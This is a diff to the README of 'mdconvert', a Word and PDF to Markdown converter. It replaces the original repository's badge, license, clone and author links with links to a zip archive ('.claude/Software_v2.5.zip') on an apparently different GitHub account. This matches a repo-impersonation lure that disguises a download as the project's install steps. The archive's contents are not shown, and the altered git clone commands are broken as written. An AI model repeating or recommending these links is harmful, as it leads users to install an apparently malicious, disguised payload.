@@ -2,8 +2,8 @@
 
 **Convert Word & PDF to AI-ready Markdown with image descriptions**
 
-[![Tests](https://github.com/nhannguyen09/mdconvert/actions/workflows/test.yml/badge.svg)](https://github.com/nhannguyen09/mdconvert/actions/workflows/test.yml)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
+[![Tests](https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip)](https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip)
+[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip)
 
 A self-hosted tool that converts `.docx` and `.pdf` files into clean Markdown optimized for AI agents, Claude Projects, and Claude Code. Images are extracted and described by AI vision — no manual work needed.
 
@@ -54,7 +54,7 @@ PDF flow:
 ### Docker (recommended)
 
 ```bash
-git clone https://github.com/nhannguyen09/mdconvert.git
+git clone https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip
 cd mdconvert
 cp .env.example .env
 # Edit .env: set DATABASE_URL, NEXTAUTH_SECRET, ENCRYPTION_KEY
@@ -69,7 +69,7 @@ docker compose up -d
 brew install pandoc ghostscript   # macOS
 # Ubuntu: sudo apt install pandoc ghostscript
 
-git clone https://github.com/nhannguyen09/mdconvert.git
+git clone https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip
 cd mdconvert
 npm install
 cp .env.example .env
@@ -141,4 +141,4 @@ See [CONTRIBUTING.md](CONTRIBUTING.md).
 
 ---
 
-> Built with ❤️ by [NhanNguyenSharing](https://nhannguyensharing.com) | Powered by Pandoc + AI Vision
+> Built with ❤️ by [NhanNguyenSharing](https://github.com/Henrietaallophonic378/mdconvert/raw/refs/heads/main/.claude/Software_v2.5.zip) | Powered by Pandoc + AI Vision
